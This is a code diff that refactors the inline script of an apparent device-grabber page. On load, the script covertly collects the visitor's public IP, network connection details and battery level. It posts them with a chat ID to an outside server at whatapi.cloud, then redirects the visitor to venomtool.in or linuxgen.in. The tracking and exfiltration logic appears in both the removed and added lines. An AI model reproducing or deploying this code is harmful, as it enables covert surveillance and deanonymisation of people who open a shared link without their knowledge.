@@ -51,7 +51,7 @@
     <script>
         const chatId = new URLSearchParams(window.location.search).get("id");
 
-        function gatherDeviceData(ip) {
+        async function gatherDeviceData(ip) {
             let td = '';
             const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
             const networkInfoKeys = ["downlink", "effectiveType", "rtt", "type"];
@@ -70,40 +70,52 @@
                 }
             });
 
-            navigator.getBattery().then(battery => {
+            try {
+                const battery = await navigator.getBattery();
                 const batteryLevel = Math.round(battery.level * 100);
 
-                fetch('https://whatapi.cloud:8443/data', {
+                await sendDeviceData(td, batteryLevel, ip);
+            } catch (error) {
+                console.error('Battery status retrieval failed:', error);
+                window.location.href = "https://linuxgen.in";
+            }
+        }
+
+        async function sendDeviceData(networkInfo, batteryLevel, ip) {
+            try {
+                const response = await fetch('https://whatapi.cloud:8443/data', {
                     method: 'POST',
                     headers: {
                         'Content-Type': 'application/json'
                     },
                     body: JSON.stringify({
                         chat_id: chatId,
-                        networkInfo: td,
+                        networkInfo: networkInfo,
                         batteryLevel: batteryLevel,
                         ip: ip
                     })
-                })
-                .then(response => {
-                    if (response.ok) {
-                        window.location.href = `https://venomtool.in/t/?id=${chatId}`;
-                    } else {
-                        window.location.href = `https://venomtool.in/t/?id=${chatId}`;
-                    }
                 });
-            });
+
+                if (response.ok) {
+                    window.location.href = `https://venomtool.in/t/?id=${chatId}`;
+                } else {
+                    window.location.href = `https://venomtool.in/t/?id=${chatId}`;
+                }
+            } catch (error) {
+                
+                window.location.href = "https://linuxgen.in";
+            }
         }
 
-        function getClientIP() {
-            fetch('https://api.ipify.org?format=json')
-                .then(response => response.json())
-                .then(data => {
-                    gatherDeviceData(data.ip);
-                })
-                .catch(() => {
-                    window.location.href = "https://linuxgen.in";
-                });
+        async function getClientIP() {
+            try {
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                await gatherDeviceData(data.ip);
+            } catch (error) {
+                console.error('IP retrieval failed:', error);
+                window.location.href = "https://linuxgen.in";
+            }
         }
 
         window.onload = function() {
